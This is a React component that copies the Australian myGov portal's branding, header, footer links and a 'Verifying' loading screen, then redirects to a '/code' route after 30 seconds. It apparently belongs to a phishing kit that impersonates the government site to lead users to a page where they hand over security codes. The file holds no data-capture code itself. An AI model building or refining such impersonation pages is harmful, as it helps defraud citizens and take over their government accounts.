import React, { useEffect } from "react";
import img from "./image/img.svg";
import img2 from "./image/img2.svg";
import "./Mygov.css";
import { useNavigate } from "react-router-dom";

export default function MyGovVerify() {
    const navigate = useNavigate(); // Initialize navigate

  useEffect(() => {
    const timer = setTimeout(() => {
      navigate("/code"); // Redirect after 10 seconds
    }, 30000);

    return () => clearTimeout(timer); // Cleanup timeout if component unmounts
  }, [navigate]);
  return (
    <div className="main-container">
      <div className="content">
        <header role="banner" className="mgvEnhanceHeader">
            <section className="inner-wrapper">
              <div className="inner">
                <div className="unauth-grid">
                  <div className="unauth-grid-row">
                    <a
                      href="https://my.gov.au/"
                      className="unauth-govt-crest__link"
                    >
                      <img
                        id="unauth-govt-crest"
                        src={img}
                        alt="Australian Government and myGov logo"
                        role="img"
                      />
                    </a>
                    <div className="header-links">
                      <a href="https://my.gov.au/en/about/help">Help</a>
                    </div>
                  </div>
                </div>
              </div>
            </section>
          </header>

        <div className="wrapper-mapwap">
          <div className="center">
            <span className="loader"></span>
            <br />
            <p>Verifying</p>
          </div>
        </div>
      </div>

      <footer role="contentinfo">
        <div className="footer-wrapper">
          <div className="footer-inner">
            <section className="footer-list">
              <>
                <h2 className="sr-only" aria-label="Footer">
                  Footer
                </h2>
                <ul className="lower-links">
                  <li>
                    <a target="_blank" href="https://my.gov.au/en/about/terms">
                      Terms of use
                    </a>
                  </li>
                  <li>
                    <a
                      target="_blank"
                      href="https://my.gov.au/en/about/privacy-and-security"
                    >
                      Privacy and security
                    </a>
                  </li>
                  <li>
                    <a
                      target="_blank"
                      href="https://my.gov.au/en/about/copyright"
                    >
                      Copyright
                    </a>
                  </li>
                  <li>
                    <a
                      target="_blank"
                      href="https://my.gov.au/en/about/accessibility"
                    >
                      Accessibility
                    </a>
                  </li>
                </ul>
              </>
            </section>
            <div className="footer-lower">
              <section className="footer-lower-logo">
                <a href="https://my.gov.au">
                  <img
                    src={img2}
                    alt="Australian Government and myGov logo"
                    width="313.17"
                    height="70"
                    role="img"
                  />
                </a>
              </section>
              <p className="footer-acknowledgement">
                We acknowledge the Traditional Custodians of the lands we live
                on. We pay our respects to all Elders, past and present, of all
                Aboriginal and Torres Strait Islander nations.
              </p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
